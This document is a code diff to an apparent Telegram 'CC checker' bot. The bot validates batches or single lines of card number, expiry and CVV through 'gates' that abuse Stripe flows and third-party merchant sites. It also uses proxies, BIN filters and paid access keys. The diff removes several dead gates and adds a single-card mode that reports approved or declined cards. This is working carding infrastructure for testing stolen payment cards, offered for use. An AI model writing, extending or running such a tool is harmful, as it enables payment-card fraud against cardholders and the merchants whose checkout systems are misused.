@@ -146,11 +146,8 @@ def set_gate_enabled(gate_key, enabled, by_user=None):
 # ============================================================
 GATE_PROBE_MAP = {
     "auth": {"name": "Stripe Auth (Dilaboards)", "cmd": "/chkapiauth"},
-    "auth2": {"name": "Stripe Auth (Stormx)", "cmd": "/chkapiauth2"},
-    "stc": {"name": "Stripe Auth (Alt)", "cmd": "/chkapistc"},
     "st1": {"name": "HiAPI Check3", "cmd": "/chkapist1"},
     "st5": {"name": "HiAPI Check", "cmd": "/chkapist5"},
-    "charge": {"name": "Stripe Charge $1-3", "cmd": "/chkapicharge"},
 }
 
 
@@ -163,31 +160,10 @@ def probe_gate(gate_key):
                                 headers={'User-Agent': _rand_ua()}, timeout=10, allow_redirects=True)
             alive = resp.status_code == 200 and 'stripe' in resp.text.lower()
             detail = f"HTTP {resp.status_code}" + (" | Stripe key found" if alive else " | No Stripe key")
-        elif gate_key == "auth2":
-            resp = requests.get('https://stripe.stormx.pw/', headers={'User-Agent': _rand_ua()}, timeout=10)
-            alive = resp.status_code == 200
-            detail = f"HTTP {resp.status_code}"
-        elif gate_key == "stc":
-            resp = requests.get('https://flavorboutique.com/my-account/', headers={'User-Agent': _rand_ua()}, timeout=10, allow_redirects=True)
-            has_stripe = 'stripe' in resp.text.lower() or 'pk_live' in resp.text or 'pk_test' in resp.text
-            alive = resp.status_code == 200 and has_stripe
-            detail = f"HTTP {resp.status_code}" + (" | Stripe found" if has_stripe else " | No Stripe")
         elif gate_key in ("st1", "st5"):
             resp = requests.get('https://ck.hiapi.club/', headers={'User-Agent': _rand_ua()}, timeout=10)
             alive = resp.status_code in (200, 403)
             detail = f"HTTP {resp.status_code}"
-        elif gate_key == "charge":
-            for merchant in STRIPE_MERCHANTS:
-                try:
-                    resp = requests.get(merchant['url'], headers={'User-Agent': _rand_ua()}, timeout=8, allow_redirects=True)
-                    pk_match = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', resp.text)
-                    if pk_match:
-                        latency = int((time.time() - start) * 1000)
-                        return True, latency, f"OK via {merchant['name']} | Stripe key found"
-                except Exception:
-                    continue
-            latency = int((time.time() - start) * 1000)
-            return False, latency, "All merchants unreachable"
         else:
             return False, 0, "Unknown gate"
 
@@ -1154,16 +1130,10 @@ def process_single_entry(entry, proxies_list, user_id, gate="auth"):
                 if not any(c_num.startswith(b) for b in user_bin_list):
                     return "SKIPPED | BIN not allowed"
 
-            if gate == "stc":
-                result = check_cc_stc(c_num, c_mm, c_yy, c_cvv, proxy_dict)
-            elif gate == "auth2":
-                result = check_cc_auth2(c_num, c_mm, c_yy, c_cvv, proxy_dict)
-            elif gate == "st1":
+            if gate == "st1":
                 result = check_cc_hiapi(c_num, c_mm, c_yy, c_cvv, "check3", proxy_dict)
             elif gate == "st5":
                 result = check_cc_hiapi(c_num, c_mm, c_yy, c_cvv, "check", proxy_dict)
-            elif gate == "charge":
-                result = check_cc_charge(c_num, c_mm, c_yy, c_cvv, proxy_dict)
             else:
                 result = run_automated_process(c_num, c_cvv, c_yy, c_mm, proxy_dict)
         else:
@@ -1178,7 +1148,7 @@ def process_single_entry(entry, proxies_list, user_id, gate="auth"):
 # ============================================================
 #  Processing runner with multi-threading + rate-limited progress
 # ============================================================
-DEFAULT_THREADS = 50
+DEFAULT_THREADS = 5
 
 
 def run_processing(lines, user_id, on_progress=None, on_complete=None, threads=DEFAULT_THREADS, gate="auth"):
@@ -1278,11 +1248,7 @@ def fmt_start(is_adm=False):
         "<b>Gates:</b>\n"
         "  /auth       — Stripe Auth (Dilaboards)\n"
         "  /st1        — HiAPI Check3\n"
-        "  /st5        — HiAPI Check\n"
-        "  /auth2      — Stripe Auth (coming soon)\n"
-        "  /stc        — Stripe Auth Alt (coming soon)\n"
-        "  /charge     — Stripe Charge (coming soon)\n"
-        "  /nonvbv     — Braintree Non-VBV (coming soon)\n\n"
+        "  /st5        — HiAPI Check\n\n"
         "<b>Commands:</b>\n"
         "  /bin        — Set BIN filter\n"
         "  /clearbin   — Clear BIN filter\n"
@@ -1306,18 +1272,14 @@ def fmt_start(is_adm=False):
             "  /broadcast  — Message all users\n"
             "  /chkapis    — Health check all APIs\n"
             "  /chkapiauth — Check auth gate\n"
-            "  /chkapiauth2— Check auth2 gate\n"
-            "  /chkapistc  — Check stc gate\n"
             "  /chkapist1  — Check st1 gate\n"
-            "  /chkapist5  — Check st5 gate\n"
-            "  /chkapicharge— Check charge gate\n\n"
+            "  /chkapist5  — Check st5 gate\n\n"
         )
 
     base += (
         "<b>How to use:</b>\n"
-        "  1. Send a .txt file\n"
-        "  2. Reply to the file with a gate (/auth, /st1, /st5, etc.)\n"
-        "  3. Wait for results\n"
+        "  <b>Single:</b> <code>/auth 4111...|01|25|123</code>\n"
+        "  <b>Bulk:</b> Send .txt → reply with /auth\n"
         f"{FOOTER}"
     )
     return base
@@ -1552,17 +1514,7 @@ def handle_update(update):
         send_message(chat_id, f"<b>Lookup</b>\n\nComing soon.{FOOTER}")
         return
 
-    # --- Gate commands (coming soon / disabled) ---
-    if text in ("/nonvbv", "/auth2", "/stc", "/charge"):
-        gate_names = {
-            "/nonvbv": "Braintree Non-VBV",
-            "/auth2": "Stripe Auth (Stormx)",
-            "/stc": "Stripe Auth (Alt)",
-            "/charge": "Stripe Charge",
-        }
-        name = gate_names[text]
-        send_message(chat_id, f"<b>{name}</b>\n\nComing soon.{FOOTER}")
-        return
+    # (dead gates removed — no coming soon handler needed)
 
     # --- /adminkey <user_id> <duration> (owner only) ---
     if text.startswith("/adminkey"):
@@ -1629,11 +1581,8 @@ def handle_update(update):
     # --- /chkapi* — Admin-only secret API health checks ---
     chkapi_cmds = {
         "/chkapiauth": "auth",
-        "/chkapiauth2": "auth2",
-        "/chkapistc": "stc",
         "/chkapist1": "st1",
         "/chkapist5": "st5",
-        "/chkapicharge": "charge",
     }
     if text in chkapi_cmds:
         if not is_admin(user_id):
@@ -1715,10 +1664,6 @@ def handle_update(update):
             ("auth", "/auth", "Stripe Auth (Dilaboards)", True),
             ("st1", "/st1", "HiAPI Check3", True),
             ("st5", "/st5", "HiAPI Check", True),
-            ("auth2", "/auth2", "Stripe Auth (Stormx)", False),
-            ("stc", "/stc", "Stripe Auth (Alt)", False),
-            ("charge", "/charge", "Stripe Charge", False),
-            ("nonvbv", "/nonvbv", "Braintree Non-VBV", False),
         ]
         gs = load_gate_stats()
         lines_out = ["<b>Available Gates</b>\n"]
@@ -2078,10 +2023,11 @@ def handle_update(update):
         send_message(chat_id, f"<b>Access Granted</b>\n\nDuration: <code>{dur_label}</code>\nLine Limit: <code>{limit_label}</code>\nWelcome aboard.{FOOTER}")
         return
 
-    # --- /auth, /auth2, /stc (gate commands) ---
-    if text in ("/auth", "/st1", "/st5"):
-        gate_map = {"/auth": ("auth", "Stripe Auth (Dilaboards)"), "/st1": ("st1", "HiAPI Check3"), "/st5": ("st5", "HiAPI Check")}
-        gate, gate_label = gate_map[text]
+    # --- Gate commands: /auth, /st1, /st5 (single card OR bulk file) ---
+    gate_map = {"/auth": ("auth", "Stripe Auth (Dilaboards)"), "/st1": ("st1", "HiAPI Check3"), "/st5": ("st5", "HiAPI Check")}
+    cmd_base = text.split()[0] if text else ""
+    if cmd_base in gate_map:
+        gate, gate_label = gate_map[cmd_base]
 
         # Check if gate is disabled
         if not is_gate_enabled(gate):
@@ -2095,9 +2041,51 @@ def handle_update(update):
             send_message(chat_id, fmt_unauthorized())
             return
 
+        # --- SINGLE CARD MODE: /auth 4111...|01|25|123 ---
+        parts = text.split(maxsplit=1)
+        if len(parts) == 2 and '|' in parts[1]:
+            cc_input = parts[1].strip()
+            c_data = cc_input.split('|')
+            if len(c_data) != 4:
+                send_message(chat_id, "<b>Invalid format.</b>\n\nUse: <code>/auth CC|MM|YY|CVV</code>" + FOOTER)
+                return
+
+            send_message(chat_id, f"<b>🔍 Checking...</b>\n<code>{cc_input}</code>")
+
+            def _single_check():
+                result = process_single_entry(cc_input, [], user_id, gate=gate)
+                r_lower = result.lower()
+                if r_lower.startswith("approved") or r_lower.startswith("charged"):
+                    icon = "✅"
+                    status = "APPROVED"
+                elif "skipped" in r_lower:
+                    icon = "⏭️"
+                    status = "SKIPPED"
+                elif "error" in r_lower or "⚠️" in result:
+                    icon = "⚠️"
+                    status = "ERROR"
+                else:
+                    icon = "❌"
+                    status = "DECLINED"
+
+                send_message(chat_id,
+                    f"<b>{icon} {status}</b>\n"
+                    f"{'─' * 28}\n\n"
+                    f"Card: <code>{cc_input}</code>\n"
+                    f"Gate: <code>{gate_label}</code>\n"
+                    f"Result: {result}"
+                    + FOOTER)
+
+            threading.Thread(target=_single_check, daemon=True).start()
+            return
+
+        # --- BULK MODE: reply to .txt file ---
         reply = msg.get("reply_to_message")
         if not reply or not reply.get("document"):
-            send_message(chat_id, f"<b>Reply to a .txt file with {text}</b>" + FOOTER)
+            send_message(chat_id,
+                f"<b>Usage:</b>\n"
+                f"  Single: <code>{cmd_base} CC|MM|YY|CVV</code>\n"
+                f"  Bulk: Reply to a .txt file with <code>{cmd_base}</code>" + FOOTER)
             return
 
         doc = reply["document"]
